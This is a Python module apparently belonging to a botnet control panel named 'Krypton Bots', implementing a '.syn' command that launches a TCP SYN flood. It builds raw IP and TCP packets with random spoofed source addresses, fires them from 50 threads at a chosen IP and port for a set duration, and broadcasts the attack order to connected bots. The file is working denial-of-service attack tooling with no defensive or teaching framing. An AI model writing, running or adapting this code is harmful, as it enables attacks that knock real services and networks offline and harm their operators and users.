from colorama import Fore
import threading
import socket
import random
import time

def send_syn(ip, port, duration):
    end_time = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while time.time() < end_time:
        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(ip))
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), int(port), 0, 0, 5, 0, 0, 0, 0)
        packet = ip_header + tcp_header
        
        try:
            sock.sendto(packet, (ip, 0))
        except Exception as e:
            print(f"Error sending SYN packet: {e}")

    sock.close()

def syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]

        info_message = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s''' % (Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, 'TCP SYN flood')

        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    for x in info_message.split('\n'):
                        send(client, '\x1b[3;31;40m' + x)
                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                    broadcast(data)

                    # Launch multiple threads for SYN flood attack
                    thread_count = 50
                    for _ in range(thread_count):
                        syn_thread = threading.Thread(target=send_syn, args=(ip, port, secs))
                        syn_thread.start()

                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.syn [IP] [PORT] [TIME]')
